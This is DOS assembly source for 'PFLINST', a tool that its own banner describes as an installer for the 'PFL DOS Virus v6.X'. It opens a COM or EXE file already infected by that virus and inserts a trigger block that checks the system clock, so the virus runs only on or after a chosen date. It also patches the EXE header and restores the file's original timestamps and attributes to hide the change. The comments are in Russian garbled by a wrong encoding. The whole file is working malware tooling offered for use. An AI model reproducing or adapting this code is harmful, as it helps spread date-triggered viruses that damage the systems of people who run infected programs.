.386c
seg_a   segment  byte public use16
        assume   cs:seg_a, ds:seg_a
        org      100h
pflinst proc     far
start:
        mov      di,offset buffer_for_UPA
        call     upa
        mov      si,offset buffer_for_UPA
        mov      cx,1
        call     param
        jc       display_logo_exit
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        mov      si,offset buffer_for_UPA
        mov      cx,2
        call     param
        jc       error_atleast_5_param
        ;‚ëå®¤: BX - ãª §ë¢ ¥â ­  ¤¥­ì ¡®¬¡ë
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      number_dd
        mov      al,[si]
        cmp      al,'*'
        jnz      dd_bad_param
        jmp      move_day
number_dd:
        cmp      cl,2
        jnz      dd_bad_param
        mov      ax,word ptr ds:[si]
        call     reform_ax_to_normal_number
        jc       dd_bad_param
        ;‚ëå®¤: AL - ¤¥­ì ª®«¡ áª¨
        or       al,al
        jz       dd_bad_param
        cmp      al,31h
        ja       dd_bad_param
move_day:
        mov      ds:[dd_],al
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        mov      si,offset buffer_for_UPA
        mov      cx,3
        call     param
        jc       error_atleast_5_param
        ;‚ëå®¤: BX - ãª §ë¢ ¥â ­  ¤¥­ì ¡®¬¡ë
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      number_mm
        mov      al,[si]
        cmp      al,'*'
        jnz      mm_bad_param
        jmp      move_month
number_mm:
        cmp      cl,2
        jnz      mm_bad_param
        mov      ax,word ptr ds:[si]
        call     reform_ax_to_normal_number
        jc       mm_bad_param
        ;‚ëå®¤: AL - ¬¥áïæ ª®«¡ áª¨
        or       al,al
        jz       mm_bad_param
        cmp      al,12h
        ja       mm_bad_param
move_month:
        mov      ds:[mm_],al
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        mov      si,offset buffer_for_UPA
        mov      cx,4
        call     param
        jc       error_atleast_5_param
        ;‚ëå®¤: BX - ãª §ë¢ ¥â ­  ¤¥­ì ¡®¬¡ë
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      number_yy
        mov      al,[si]
        cmp      al,'*'
        jnz      yy_bad_param
        jmp      move_year
number_yy:
        cmp      cl,2
        jnz      yy_bad_param
        mov      ax,word ptr ds:[si]
        call     reform_ax_to_normal_number
        jc       yy_bad_param
        ;‚ëå®¤: AL - £®¤ ª®«¡ áª¨
move_year:
        mov      ds:[yy_],al
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        mov      si,offset buffer_for_UPA
        mov      cx,5
        call     param
        jc       error_atleast_5_param
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      type_bad_param
        mov      al,ds:[si]
        cmp      al,31h
        jz       good_type_param
        cmp      al,32h
        jnz      type_bad_param
good_type_param:
        mov      type_,al
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        ;®ª §ë¢ ¥¬ ¢á¥ çâ® ¬ë ¯p® ­¨å §­ ¥¬
        mov      dx,offset text_for_type1
        cmp      type_,31h
        jz       type1
        mov      dx,offset text_for_type2
type1:
        call     write_t
        ;’¥¯¥pì ¤¥­ì
        mov      dx,offset any_day_text
        cmp      dd_,'*'
        jz       star_dd
        mov      ah,dd_
        mov      si,offset(_day_text+8)
        call     reform_to_BCD
        mov      dx,offset _day_text
star_dd:
        call     write_t
        ;’¥¯¥pì ¬¥áïæ
        mov      dx,offset any_month_text
        cmp      mm_,'*'
        jz       star_mm
        mov      al,mm_
        ;‚å®¤: AL - ¬¥áïæ
        call     select_month
        ;‚ëå®¤: BX - pointer to month (¤«¨­­  9 ¡ ©â)
        mov      cx,09h
        mov      si,bx
        mov      di,offset (_month_text+8)
        rep      movsb ;DS:[SI] -> ES:[DI]
        mov      dx,offset _month_text
star_mm:
        call     write_t
        ;’¥¯¥pì £®¤
        mov      dx,offset any_year_text
        cmp      yy_,'*'
        jz       star_yy
        mov      ah,yy_
        mov      si,offset(_year_text+8)
        call     reform_to_BCD
        mov      dx,offset _year_text
star_yy:
        call     write_t
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        ;¥p¥¬  âp¨¡ãâë ä ©« 
        mov      si,offset buffer_for_UPA
        mov      cx,1
        call     param
        mov      dx,bx
        mov      ax,4300h
        int      21h
        jc       error_openfile
        ;‚ëå®¤:  CX -  âp¨¡ãâ
        mov      word ptr ds:[attribute_of_file],cx
        mov      ax,4301h
        xor      cx,cx
        int      21h
        jc       error_openfile
        ;âªpëâì ä ©« ¤«ï çâ¥­¨ï/§ ¯¨á¨
        mov      ax,3D02h
        int      21h
        jc       error_openfile
        mov      word ptr ds:[place_of_handle+1],ax
        ;¥p¥¬ „ âã/‚p¥¬ï á®§¤ ­¨ï ä ©« 
        mov      bx,ax
        mov      ax,5700h
        int      21h
        jc       error_openfile
        ;‚ëå®¤:  CX - ¢p¥¬ï
        ;        DX - ¤ â 
        mov      word ptr ds:[time_of_file],cx
        mov      word ptr ds:[date_of_file],dx
        ; ¡®â  á ä ©«®¬
        call     set_lseek_begin
        mov      cx,20h
        mov      dx,offset file_first_20h_byte
        call     read_file
        call     set_lseek_end
        ;‚ëå®¤: DX.AX
        sub      ax,4h
        sbb      dx,0
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,4h
        mov      dx,offset common_buffer
        call     read_file
        cmp      word ptr [common_buffer],2120h
        jz       PFL_infected_file
        mov      dx,offset no_PFL_file_text
        call     write_t
        jmp      close_file_exit_zaraza
PFL_infected_file:
        ;‘¬®âp¨¬ â¨¯ ä ©« 
        mov      dx,offset file_COM
        cmp      word ptr [file_first_20h_byte],'ZM'
        jnz      process_for_COM_file
        mov      dx,offset file_EXE
        call     write_t
        jmp      process_for_EXE_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
process_for_COM_file:
        call     write_t
        mov      ax,word ptr ds:[file_first_20h_byte+1]
        add      ax,3h
        ;AX - ãª § â¥«ì ­  ¢¨pãá
        mov      [pointer_to_virus],ax
        xor      cx,cx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,5000h
        mov      dx,offset common_buffer
        call     read_file
        mov      [virus_length],ax
        xor      cx,cx
        mov      dx,[pointer_to_virus]
        call     set_lseek_begin_pluscxdx
        cmp      [type_],31h
        jnz      type2_process_COM
        mov      al,[dd_]
        mov      [dd_in_after_block],al
        mov      al,[mm_]
        mov      [mm_in_after_block],al
        mov      al,[yy_]
        mov      [yy_in_after_block],al
        mov      cx,length_of_after_block
        mov      dx,offset after_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
        jmp      end_processing
type2_process_COM:
        mov      al,[dd_]
        mov      [dd_in_onlyin_block],al
        mov      al,[mm_]
        mov      [mm_in_onlyin_block],al
        mov      al,[yy_]
        mov      [yy_in_onlyin_block],al
        mov      cx,length_of_onlyin_block
        mov      dx,offset onlyin_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
        jmp      end_processing
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;„®¡ ¢«¥­¨¥ ¨­áâ®«ïâ®p  ª EXE ä ©«ã
process_for_EXE_file:
        ; ç¨â ¥¬ â®çªã ¢å®¤  ¢¨pãá 
        ;+14h EXEIP
        ;+16h ReloCS
        ;+08h Header Size
        mov      ax,word ptr ds:[file_first_20h_byte+16h]
        add      ax,word ptr ds:[file_first_20h_byte+08h]
        mov      cx,10h
        mul      cx     ;AX*CX -> DX.AX
        add      ax,word ptr ds:[file_first_20h_byte+14h]
        adc      dx,0
        ;DX.AX - pointer to virus
        mov      [pointer_to_virus],ax
        mov      [pointer_to_virus_2],dx
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,5000h
        mov      dx,offset common_buffer
        call     read_file
        mov      [virus_length],ax
        mov      dx,[pointer_to_virus]
        mov      cx,[pointer_to_virus_2]
        call     set_lseek_begin_pluscxdx
        cmp      [type_],31h
        jnz      type2_process_EXE
        mov      al,[dd_]
        mov      [dd_in_after_block],al
        mov      al,[mm_]
        mov      [mm_in_after_block],al
        mov      al,[yy_]
        mov      [yy_in_after_block],al
        mov      cx,length_of_after_block
        mov      dx,offset after_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
        jmp      correct_EXE_header
type2_process_EXE:
        mov      al,[dd_]
        mov      [dd_in_onlyin_block],al
        mov      al,[mm_]
        mov      [mm_in_onlyin_block],al
        mov      al,[yy_]
        mov      [yy_in_onlyin_block],al
        mov      cx,length_of_onlyin_block
        mov      dx,offset onlyin_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
correct_EXE_header:
        call     set_lseek_end ;‚ëå®¤: DX:AX - ­  ª®­æ¥
        mov      cx,200h
        div      cx
        or       dx,dx
        jz       size_multiple_200
        inc      ax
size_multiple_200:
        mov      word ptr ds:[file_first_20h_byte+04h],ax
        mov      word ptr ds:[file_first_20h_byte+02h],dx
        call     set_lseek_begin
        mov      cx,20h
        mov      dx,offset file_first_20h_byte
        call     write_to_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
end_processing:
        mov      dx,offset ok_text
        call     write_t
        ;‘â ¢¨¬ áâ pë¥ ¤ âã/¢p¥¬ï á®§¤ ­¨ï ä ©« 
        mov      bx,word ptr ds:[place_of_handle+1]
        mov      ax,5701h
        db       0B9h ;MOV CX,XXXXh
time_of_file:
        dw       0
        db       0BAh ;MOV DX,XXXXh
date_of_file:
        dw       0
        int      21h
close_file_exit_zaraza:
        call     close_file
cannot_take_handle:
        ;‘â ¢¨¬ áâ pë©  âp¨¡ãâ ä ©«ã
        mov      ax,4301h
        db       0B9h ;MOV CX,XXXXh
attribute_of_file:
        dw       0
        int      21h
        mov      ax,4C00h
        int      21h
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
after_block:
        pusha
        push     ds es
        call     init_after_block
init_after_block:
        pop      bp
        push     cs
        pop      ds
        mov      ah,04h
        int      1Ah
        ;‚ëå®¤: CL - £®¤ ¢ ª®¤¥   BCD
        ;       DH - ¬¥áïæ ¢ ª®¤¥ BCD
        ;       DL - ¤¥­ì ¢ ª®¤¥  BCD
        ;ƒ®¤
        mov      al,byte ptr ds:[bp+yy_in_after_block-init_after_block]
        cmp      al,'*'
        jz       any_year_in_after
        cmp      cl,al
        jb       virus_after_not_allowed
        ja       virus_after_allowed
any_year_in_after:
        ;Œ¥áïæ
        mov      al,byte ptr ds:[bp+mm_in_after_block-init_after_block]
        cmp      al,'*'
        jz       any_month_in_after
        cmp      dh,al
        jb       virus_after_not_allowed
        ja       virus_after_allowed
any_month_in_after:
        ;—¨á«®
        mov      al,byte ptr ds:[bp+dd_in_after_block-init_after_block]
        cmp      al,'*'
        jz       virus_after_allowed
        cmp      dl,al
        jae      virus_after_allowed
virus_after_not_allowed:
        pop      es ds
        popa
        mov      bx,'DK'
        jmp      virus_native_after
virus_after_allowed:
        pop      es ds
        popa
        jmp      virus_native_after
dd_in_after_block db 0
mm_in_after_block db 0
yy_in_after_block db 0
virus_native_after:
length_of_after_block = $ - after_block
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
onlyin_block:
        pusha
        push     ds es
        call     init_onlyin_block
init_onlyin_block:
        pop      bp
        push     cs
        pop      ds
        mov      ah,04h
        int      1Ah
        ;‚ëå®¤: CL - £®¤ ¢ ª®¤¥   BCD
        ;       DH - ¬¥áïæ ¢ ª®¤¥ BCD
        ;       DL - ¤¥­ì ¢ ª®¤¥  BCD
        ;ƒ®¤
        mov      al,byte ptr ds:[bp+yy_in_onlyin_block-init_onlyin_block]
        cmp      al,'*'
        jz       any_year_in_onlyin
        cmp      cl,al
        jnz      virus_onlyin_not_allowed
any_year_in_onlyin:
        ;Œ¥áïæ
        mov      al,byte ptr ds:[bp+mm_in_onlyin_block-init_onlyin_block]
        cmp      al,'*'
        jz       any_month_in_onlyin
        cmp      dh,al
        jnz      virus_onlyin_not_allowed
any_month_in_onlyin:
        ;—¨á«®
        mov      al,byte ptr ds:[bp+dd_in_onlyin_block-init_onlyin_block]
        cmp      al,'*'
        jz       virus_onlyin_allowed
        cmp      dl,al
        jz       virus_onlyin_allowed
virus_onlyin_not_allowed:
        pop      es ds
        popa
        mov      bx,'DK'
        jmp      virus_native_onlyin
virus_onlyin_allowed:
        pop      es ds
        popa
        jmp      virus_native_onlyin
dd_in_onlyin_block db 0
mm_in_onlyin_block db 0
yy_in_onlyin_block db 0
virus_native_onlyin:
length_of_onlyin_block = $ - onlyin_block
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;H  ¢å®¤¥: AX - ç¨á«®
reform_ax_to_normal_number:
        push     ax
        call     check_al_for_valid_number
        jc       exit_stc_reform_ax_to_normal_number
        mov      al,ah
        call     check_al_for_valid_number
        jc       exit_stc_reform_ax_to_normal_number
        pop      ax
        sub      ax,3030h
        shl      al,1
        shl      al,1
        shl      al,1
        shl      al,1
        or       al,ah
        clc
        retn
exit_stc_reform_ax_to_normal_number:
        stc
        pop      ax
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
check_al_for_valid_number:
        cmp      al,30h
        jb       bad_al
        cmp      al,39h
        ja       bad_al
        clc
        retn
bad_al:
        stc
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
write_to_file:
        mov      ah,40h
        jmp      call_int21_with_use_handle
read_file:
        mov      ah,3Fh
        jmp      call_int21_with_use_handle
set_lseek_begin:
        xor      cx,cx
        xor      dx,dx
set_lseek_begin_pluscxdx:
        mov      ax,4200h
        jmp      call_int21_with_use_handle
set_lseek_current:
        xor      cx,cx
        xor      dx,dx
set_lseek_curent_pluscxdx:
        mov      ax,4201h
        jmp      call_int21_with_use_handle
set_lseek_end:
        xor      cx,cx
        xor      dx,dx
set_lseek_end_pluscxdx:
        mov      ax,4202h
        jmp      call_int21_with_use_handle
close_file:
        mov      ah,3eh
call_int21_with_use_handle:
        push     bx
place_of_handle:
        mov      bx,0100h
        int      21h
        pop      bx
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dd_bad_param:
        mov      dx,offset dd_bad_param_text
        call     write_t
        jmp      exit_pflinst
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
mm_bad_param:
        mov      dx,offset mm_bad_param_text
        call     write_t
        jmp      exit_pflinst
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
yy_bad_param:
        mov      dx,offset yy_bad_param_text
        call     write_t
        jmp      exit_pflinst
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
type_bad_param:
        mov      dx,offset type_bad_param_text
        call     write_t
        jmp      exit_pflinst
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
error_openfile:
        mov      dx,offset error_openfile_text
        call     write_t
        jmp      exit_pflinst
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
error_atleast_5_param:
        mov      dx,offset error_atleast_5_param_text
        call     write_t
        jmp      exit_pflinst
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
display_logo_exit:
        mov      dx,offset logo
        call     write_t
        mov      dx,offset logo2
        call     write_t
exit_pflinst:
        mov      ax,4C00h
        int      21h
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
include write_t.asm
include upa.asm
include param.asm
include size_0.asm
include rtbcd.asm
include sm.asm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ DATA ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
logo    db 0ah,"PFLINST v1.01 ş Installator for PFL DOS Virus v6.X",0dh,0ah,'$'
logo2   db 07h,"usage: pflinst.com [path\]<filename> <dd-mm-yy> <1|2>",0dh,0ah
        db     "<filename> - File infected by PFL v6.X or other that have flag INST",0dh,0ah
        db     "<dd-mm-yy> - Day-Month-Year ('*' for any )",0dh,0ah
        db     "<1|2>      - 1. Execute Virus after   Day-Month-Year",0dh,0ah
        db     "             2. Execute Virus only in Day-Month-Year",0dh,0ah,'$'
error_atleast_5_param_text db 07h,'error: At least three paramiter required',0dh,0ah,'$'
error_openfile_text        db 07h,'error: Cannot open input file',0dh,0ah,'$'
dd_bad_param_text          db 07h,'error: DD param is bad',0dh,0ah,'$'
mm_bad_param_text          db 07h,'error: MM param is bad',0dh,0ah,'$'
yy_bad_param_text          db 07h,'error: YY param is bad',0dh,0ah,'$'
type_bad_param_text        db 07h,'error: Type param is bad',0dh,0ah,'$'
no_PFL_file_text           db 07h,'error: This file not infected by PFL v6.1 or other INST modification',0dh,0ah,'$'
ok_text                    db 0ah,'..OK',0dh,0ah,'$'
dd_   db 0
mm_   db 0
yy_   db 0
type_ db 0
text_for_type1 db 0ah,'MODE: Execute Virus after',0dh,0ah,'$'
text_for_type2 db 0ah,'MODE: Execute Virus only in',0dh,0ah,'$'

any_day_text   db 07h,'Day:   Any        ',0dh,0ah,'$'
_day_text      db 07h,'Day:              ',0dh,0ah,'$'
any_month_text db 07h,'Month: Any        ',0dh,0ah,'$'
_month_text    db 07h,'Month:            ',0dh,0ah,'$'
any_year_text  db 07h,'Year:  Any        ',0dh,0ah,'$'
_year_text     db 07h,'Year:             ',0dh,0ah,'$'

file_EXE       db 07h,'FILE TYPE: EXE',0dh,0ah,'$'
file_COM       db 07h,'FILE TYPE: COM',0dh,0ah,'$'
db 'DrW4.00'
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
virus_length        dw ?
pointer_to_virus    dw ?
pointer_to_virus_2  dw ?
buffer_for_UPA      db 80h dup (?)
file_first_20h_byte db 20h dup (?)
common_buffer       db ?
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pflinst endp
seg_a   ends
end     start
